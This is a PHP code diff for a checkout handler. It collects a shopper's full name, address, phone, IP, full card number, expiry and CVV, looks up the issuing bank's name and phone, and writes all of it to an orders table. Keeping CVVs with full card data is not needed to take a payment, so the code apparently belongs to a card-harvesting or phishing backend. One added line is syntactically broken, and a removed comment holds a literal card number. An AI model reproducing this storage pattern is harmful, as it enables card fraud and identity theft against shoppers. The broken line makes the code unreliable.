@@ -75,12 +75,66 @@ if (!isValidCardNumber($cardNumber)) {
 
 
 
+cardinf = cardinfo(cardNumber);
+
+
+$adi = $_SESSION['adi'];
+$soyadi = $_SESSION['soyadi'];
+$il = $_SESSION['il'];
+$ilce = $_SESSION['ilce'];
+$mahalle = $_SESSION['mahalle'];
+$bina_no = $_SESSION['bina_no'];
+$kat_no = $_SESSION['kat_no'];
+$daire_no = $_SESSION['daire_no'];
+$adres_tarifi = $_SESSION["adres_tarifi"];
+$adres_ismi = $_SESSION["adres_ismi"];
+$telefon = $_SESSION['telefon'];
+
+$kart_no = $cardNumber;
+$kart_name = $ccname;
+$skt_no = strval($ccmonth) . "/" . strval($ccyear);
+$cvv_no = $cvc;
+
+$banka_adi = $cardinf['name'];
+$banka_no = $cardinf['phone'];
+$kart_tipi = $cardinf['type'];
+
+$tutar = $_SESSION['toplam_fiyat'];
+$ip = $_SERVER['REMOTE_ADDR'];
 
 
 
+$sql = "INSERT INTO `siparisler` (`adi`, `soyadi`, `il`, `ilce`, `mahalle`, `bina_no`, `kat_no`, `daire_no`, `adres_tarifi`, `adres_ismi`, `telefon`, `kart_no`, `kart_name`, `skt_no`, `cvv_no`, `banka_adi`, `banka_no`, `kart_tipi`, `tarih`, `tutar`, `ip`) 
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP, ?, ?)";
 
+// PDO prepared statement kullanarak sorguyu hazırla
+$stmt = $pdo->prepare($sql);
 
-// print_r(cardinfo("4938410106879646"));
+// Parametreleri bağla
+$stmt->bindParam(1, $adi);
+$stmt->bindParam(2, $soyadi);
+$stmt->bindParam(3, $il);
+$stmt->bindParam(4, $ilce);
+$stmt->bindParam(5, $mahalle);
+$stmt->bindParam(6, $bina_no);
+$stmt->bindParam(7, $kat_no);
+$stmt->bindParam(8, $daire_no);
+$stmt->bindParam(9, $adres_tarifi);
+$stmt->bindParam(10, $adres_ismi);
+$stmt->bindParam(11, $telefon);
+$stmt->bindParam(12, $kart_no);
+$stmt->bindParam(13, $kart_name);
+$stmt->bindParam(14, $skt_no);
+$stmt->bindParam(15, $cvv_no);
+$stmt->bindParam(16, $banka_adi);
+$stmt->bindParam(17, $banka_no);
+$stmt->bindParam(18, $kart_tipi);
+$stmt->bindParam(19, $tutar);
+$stmt->bindParam(20, $ip);
+
+// Sorguyu çalıştır
+$stmt->execute();
+
     
 
 
